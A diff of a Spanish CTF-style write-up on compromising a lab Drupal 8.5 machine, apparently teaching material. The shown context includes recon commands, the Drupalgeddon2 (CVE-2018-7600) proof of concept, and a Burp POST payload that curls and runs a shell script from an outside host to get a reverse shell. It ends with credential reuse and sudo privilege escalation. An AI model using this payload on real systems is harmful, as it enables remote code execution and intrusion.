@@ -37,7 +37,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
 nmap -p80 -sCV -Pn 172.17.0.2 -oN targeted
 ```
 
-![[1-Reconocimientonmap.png]]
+![1-Reconocimientonmap.png](images/1-Reconocimientonmap.png)
 
 Los resultados muestran el servicio HTTP expuesto en el puerto `80`. Además, mediante la respuesta del servidor se identifica que está ejecutando un CMS, concretamente **Drupal 8**.
 
@@ -60,11 +60,11 @@ gobuster dir -u http://172.17.0.2/ \
 -b 403,404
 ```
 
-![[2-EnumeracionGobuster.png]]
+![2-EnumeracionGobuster.png](images/2-EnumeracionGobuster.png)
 
 Posteriormente se inspecciona la aplicación web para identificar la versión exacta de Drupal:
 
-![[3-EnumeracionVersionDrupal.png]]
+![3-EnumeracionVersionDrupal.png](images/3-EnumeracionVersionDrupal.png)
 
 Una vez obtenida la versión de Drupal se realiza una búsqueda de vulnerabilidades conocidas:
 
@@ -72,7 +72,7 @@ Una vez obtenida la versión de Drupal se realiza una búsqueda de vulnerabilida
 searchsploit drupal 8.5
 ```
 
-![[5-EnumeracionExploit.png]]
+![5-EnumeracionExploit.png](images/5-EnumeracionExploit.png)
 
 Se identifica una vulnerabilidad de ejecución remota de comandos asociada a **Drupal 8.5**. Para comprender mejor el funcionamiento de la vulnerabilidad se utiliza una PoC en Python en lugar de Metasploit.
 
@@ -84,9 +84,9 @@ searchsploit -m php/webapps/44448.py
 python3 44448.py
 ```
 
-![[6-EnumeracionExploitPoC.png]]
+![6-EnumeracionExploitPoC.png](images/6-EnumeracionExploitPoC.png)
 
-![[7-EnumeracionExploitResult.png]]
+![7-EnumeracionExploitResult.png](images/7-EnumeracionExploitResult.png)
 
 Se confirma que la aplicación es vulnerable a **CVE-2018-7600 (Drupalgeddon2)**.
 
@@ -122,7 +122,7 @@ Como resultado, Drupal ejecuta el comando y devuelve:
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-![[9-ExplotacionBurpSuitePrueba.png]]
+![9-ExplotacionBurpSuitePrueba.png](images/9-ExplotacionBurpSuitePrueba.png)
 
 Con esto se confirma la ejecución remota de comandos como el usuario `www-data`.
 
@@ -150,7 +150,7 @@ POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_f
 form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=curl -s http://172.17.0.1:8000/shell.sh -o /tmp/shell.sh | chmod +x /tmp/shell.sh | bash /tmp/shell.sh
 ```
 
-![[10-ExplotacionBurpSuiteRevShell.png]]
+![10-ExplotacionBurpSuiteRevShell.png](images/10-ExplotacionBurpSuiteRevShell.png)
 
 Una vez obtenida la reverse shell se realiza un tratamiento de la TTY:
 
@@ -169,7 +169,7 @@ export SHELL=bash
 stty rows 39 columns 184
 ```
 
-![[11-ExplotacionRevShell.png]]
+![11-ExplotacionRevShell.png](images/11-ExplotacionRevShell.png)
 
 **Vector:** CVE-2018-7600 (Drupalgeddon2) mediante abuso del parámetro `#post_render`.
 
@@ -187,7 +187,7 @@ find / -name "settings.php" 2>/dev/null
 cat ./sites/default/settings.php
 ```
 
-![[12-PrivescUser.png]]
+![12-PrivescUser.png](images/12-PrivescUser.png)
 
 Dentro del archivo `settings.php` se encuentran credenciales reutilizadas de un usuario del sistema.
 
@@ -197,13 +197,13 @@ Tras acceder con dichas credenciales se realiza una enumeración de permisos sud
 sudo -l
 ```
 
-![[13-PrivescBinarios.png]]
+![13-PrivescBinarios.png](images/13-PrivescBinarios.png)
 
 Se observa que el usuario puede ejecutar los binarios `ls` y `grep` con privilegios de administrador.
 
 Mediante el abuso de estos permisos se consigue acceder a información restringida del sistema y obtener la contraseña del usuario root.
 
-![[14-PrivescRoot.png]]
+![14-PrivescRoot.png](images/14-PrivescRoot.png)
 
 **Vector:** permisos sudo excesivamente permisivos sobre binarios.
 
